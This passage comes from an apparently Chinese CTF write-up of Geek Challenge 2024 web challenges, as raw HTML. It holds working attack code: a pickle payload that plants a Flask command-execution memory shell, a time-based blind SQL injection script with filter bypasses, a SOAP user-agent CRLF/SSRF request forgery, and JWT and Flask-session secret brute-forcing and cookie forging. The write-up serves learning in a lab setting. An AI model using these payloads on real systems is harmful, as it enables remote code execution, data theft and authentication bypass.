class="string">f&quot;Final FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写内存马也可以<br>内存马板子</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存马</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd_injection = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (</span><br><span class="line">            <span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span></span><br><span class="line">            <span class="string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span></span><br><span class="line">            + cmd_injection</span><br><span class="line">            + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类实例并序列化为pickle，再进行base64编码</span></span><br><span class="line">a = Pet()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b).decode())</span><br></pre></td></tr></table></figure><p>因为用一次就会爆500，所以用python读取。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span>&#125;</span><br><span class="line">payload = <span class="string">&quot;gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg==&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">url = <span class="string">&quot;http://5000-61f7d735-0939-4825-97fd-785ea19574d4.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">r = sess.post(url=url + <span class="string">&quot;login&quot;</span>, cookies=cookies, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = sess.get(</span><br><span class="line">    url=url + <span class="string">&quot;cmd?cmd=cat /flag&quot;</span>,</span><br><span class="line">    cookies=cookies,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="funnySQL（复现）">funnySQL（复现）</h2><p>黑名单：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or| |\n|--|sleep|=|ascii/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不准用！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无回显，想到了时间盲注，sleep没了用benchmark。参考官方WP，这题不需要无列名，只有一列。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80-da8c321e-f040-42c1-8bef-b4b844370336.challenge.ctfplus.cn/?username=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">3</span>  <span class="comment"># 设置延时阈值，秒数</span></span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">&quot;&#x27;||if(substr((select version()),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># 10_2_26-MariaDB-log</span></span><br><span class="line">payload1 = <span class="string">&quot;&#x27;||if(substr((select group_concat(database())),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># syclover</span></span><br><span class="line">payload2 = <span class="string">&quot;&#x27;||if((substr((select table_name from mysql.innodb_table_stats where database_name=&#x27;syclover&#x27; limit 0,1),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;),benchmark(10000000,sha1(1)),0)#&quot;</span>  <span class="comment"># Rea11ys3ccccccr3333t</span></span><br><span class="line"><span class="comment"># sys.schema_auto_increment_columns</span></span><br><span class="line"><span class="comment"># sys.schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics</span></span><br><span class="line"><span class="comment"># sys.x$ps_schema_table_statistics_io</span></span><br><span class="line"><span class="comment"># mysql.innodb_table_stats</span></span><br><span class="line"><span class="comment"># mysql.innodb_index_stats</span></span><br><span class="line">payload3 = <span class="string">&quot;&#x27;||if(substr((select * from Rea11ys3ccccccr3333t),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(10000000,sha1(1)),0)#&quot;</span> <span class="comment"># </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 从1开始</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload = payload3.<span class="built_in">format</span>(i, j).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\x09&quot;</span>)</span><br><span class="line">        full_url = url + quote(payload)</span><br><span class="line">        <span class="built_in">print</span>(full_url)</span><br><span class="line">        <span class="comment"># 记录请求开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=full_url)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否触发防御</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;不准用&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请求被阻止，退出。&quot;</span>)</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算响应时间</span></span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在测试字符: <span class="subst">&#123;j&#125;</span>, 响应时间: <span class="subst">&#123;response_time:<span class="number">.2</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否达到延时阈值</span></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= timeout_threshold:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到字符: <span class="subst">&#123;j&#125;</span>, 当前 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有更多字符，退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实测benchmark(1000000,md5(1))在payload0和payload1是能跑出结果，但在payload2就不行，而benchmark(10000000,sha1(1))就能跑所有的payload，吐了啊。。。</p><h2 id="ezSSRF（复现）">ezSSRF（复现）</h2><p><strong>www.zip</strong>存在源码泄露<br>h4d333333.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calculator.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没想到被h4d333333.php中的echo file_get_contents(“result”);误导了，以为传ssrf会有回显，结果传完啥都没有就没尝试了。<br>其实直接读result文件就可以，echo file_get_contents当不存在就好<br>原理是soap传递时，UA如果可控。就可以伪造HTTP包进行SSRF和CRLF攻击。<br>自己写的soap UA伪造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/calculator.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;expression=system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">#$user_agent = &quot;hatchet\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot; . (string) strlen($data) . &quot;\r\n&quot;</span></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&quot;hatchet\r\n\r\n\r\n\r\n\r\nPOST /calculator.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) . <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    . <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$headers</span>)</span><br><span class="line">    . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$user_agent</span>);</span><br></pre></td></tr></table></figure><p>真简单啊</p><h2 id="py-game（复现）">py_game（复现）</h2><p>用flask-unsign可以预先跑一遍字典爆破secret_key（可以排除一些弱口令）</p><p>个人爆破jwt脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4&quot;</span>  <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;./crypto/wordlist.txt&quot;</span>  <span class="comment"># 枚举密码字典文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip()  <span class="comment"># 去除每行后面的换行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(</span><br><span class="line">                token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">            )  <span class="comment"># 设置编码方式为 HS256  ！这里自行更改</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (</span><br><span class="line">            jwt.exceptions.ExpiredSignatureError,</span><br><span class="line">            jwt.exceptions.InvalidAudienceError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.ImmatureSignatureError,</span><br><span class="line">        ):  <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:  <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>flask-unsign使用decodeflask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8' --secret 'CHANGEME'爆破密钥flask-unsign --unsign --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM'encodeflask-unsign --sign --cookie &quot;&#123;'logged_in': True&#125;&quot; --secret 'CHANGEME'</code></pre><p>使用flask-unsign</p><pre><code>flask-unsign --unsign --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM'</code></pre><p>跑出密钥值为a123456。伪造cookie为admin</p><pre><code>flask-unsign --sign --cookie &quot;&#123;'_flashes': [('success', '登录成功')], 'username': 'admin'&#125;&quot; --secret 'a123456'</code></pre><p>admin页面有源码下载，反编译为 <a href="http://app.py">app.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [</span><br><span class="line">    admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register = app.route(<span class="string">&#x27;/register&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: password &#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = app.route(<span class="string">&#x27;/login&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, **(<span class="string">&#x27;encoding&#x27;</span>,)) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">play = app.route(<span class="string">&#x27;/play&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(play)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], **(<span class="string">&#x27;username&#x27;</span>,))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">admin = app.route(<span class="string">&#x27;/admin&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;as_attachment&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">downloads321 = app.route(<span class="string">&#x27;/downloads321&#x27;</span>)(downloads321)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span 